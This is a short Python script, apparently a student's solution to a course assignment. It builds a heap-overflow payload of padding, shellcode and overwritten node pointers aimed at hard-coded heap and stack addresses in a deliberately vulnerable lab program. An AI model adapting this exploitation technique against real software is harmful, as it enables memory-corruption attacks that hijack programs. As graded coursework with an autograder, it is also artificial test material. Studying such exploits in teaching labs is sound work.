#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# You MUST fill in the values of the a, b, and c node pointers below. When you
# use heap addresses in your main solution, you MUST use these values or
# offsets from these values. If you do not correctly fill in these values and use
# them in your solution, the autograder may be unable to correctly grade your
# solution.

# IMPORTANT NOTE: When you pass your 3 inputs to your program, they are stored
# in memory inside of argv, but these addresses will be different then the
# addresses of these 3 nodes on the heap. Ensure you are using the heap
# addresses here, and not the addresses of the 3 arguments inside argv.

node_a = 0x080dd2f0
node_b = 0x080dd320
node_c = 0x080dd350

# Example usage of node address with offset -- Feel free to ignore
a_plus_4 = pack("<I", node_a + 4)

padded_shellcode =  shellcode[:3] + b'\x41' + shellcode[3:]

# Your code here
sys.stdout.buffer.write(b'\x41'*24)
sys.stdout.buffer.write(padded_shellcode)
'''sys.stdout.buffer.write(padded_shellcode[-4:])
sys.stdout.buffer.write(padded_shellcode[-8:-4])
sys.stdout.buffer.write(padded_shellcode[-12:-8])
sys.stdout.buffer.write(padded_shellcode[-16:-12])
sys.stdout.buffer.write(padded_shellcode[-20:-16])
sys.stdout.buffer.write(padded_shellcode[:-20])'''

sys.stdout.buffer.write(b'\x20')


sys.stdout.buffer.write(b'\x41'*40)
sys.stdout.buffer.write(pack("<I", node_b+4))
sys.stdout.buffer.write(pack("<I", 0xfffee17c))

sys.stdout.buffer.write(b'\x20')

sys.stdout.buffer.write(b'\x41'*40)

sys.stdout.buffer.write(b'\x20')

